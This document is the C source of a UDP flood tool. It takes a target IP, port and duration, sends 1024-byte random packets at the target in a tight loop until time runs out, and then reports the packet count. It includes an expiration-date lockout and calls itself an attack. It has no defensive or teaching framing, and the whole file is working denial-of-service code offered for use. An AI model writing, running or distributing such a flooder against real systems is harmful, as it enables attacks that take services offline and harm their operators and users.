#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>

#define EXPIRATION_YEAR 2026  // Updated expiration year
#define EXPIRATION_MONTH 10   // Updated expiration month (October)
#define EXPIRATION_DAY 1      // Updated expiration day

#define FIXED_PACKET_SIZE 1024  // Set a fixed packet size of 1024 bytes

// Structure to store attack parameters
typedef struct {
    char *target_ip;
    int target_port;
    int duration;
} attack_params;

volatile int keep_running = 1;
volatile unsigned long total_packets_sent = 0;
char *global_payload = NULL; // Shared payload buffer

// Signal handler to stop the attack
void handle_signal(int signal) {
    keep_running = 0;
}

// Function to generate a random payload
void generate_random_payload(char *payload, int size) {
    for (int i = 0; i < size; i++) {
        payload[i] = (rand() % 256);
    }
}

// Function to perform the UDP flooding
void udp_flood(attack_params *params) {
    int sock;
    struct sockaddr_in server_addr;

    // Create a UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }

    // Set up server address structure
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    // Time-bound attack loop
    time_t end_time = time(NULL) + params->duration;
    while (time(NULL) < end_time && keep_running) {
        sendto(sock, global_payload, FIXED_PACKET_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        __sync_fetch_and_add(&total_packets_sent, 1); // Thread-safe increment
    }

    close(sock);
}

int main(int argc, char *argv[]) {
    // Get the current time
    time_t now;
    time(&now);

    struct tm *local = localtime(&now);
    if (local->tm_year + 1900 > EXPIRATION_YEAR ||
        (local->tm_year + 1900 == EXPIRATION_YEAR && local->tm_mon + 1 > EXPIRATION_MONTH) ||
        (local->tm_year + 1900 == EXPIRATION_YEAR && local->tm_mon + 1 == EXPIRATION_MONTH && local->tm_mday > EXPIRATION_DAY)) {
        printf("Expired. Cannot run this tool.\n");
        return EXIT_FAILURE;
    }

    if (argc != 4) {
        printf("Usage: %s [IP] [PORT] [DURATION]\n", argv[0]);
        return EXIT_FAILURE;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    if (duration <= 0) {
        printf("Invalid duration.\n");
        return EXIT_FAILURE;
    }

    signal(SIGINT, handle_signal);

    // Allocate and pre-generate the shared payload with fixed packet size
    global_payload = (char *)malloc(FIXED_PACKET_SIZE);
    if (!global_payload) {
        perror("Failed to allocate memory for payload");
        return EXIT_FAILURE;
    }
    generate_random_payload(global_payload, FIXED_PACKET_SIZE);

    attack_params params;
    params.target_ip = target_ip;
    params.target_port = target_port;
    params.duration = duration;

    // Call the udp_flood function directly as there is only one thread
    udp_flood(&params);

    printf("Attack finished. Total packets sent: %lu\n", total_packets_sent);

    free(global_payload); // Free the shared payload
    return 0;
}
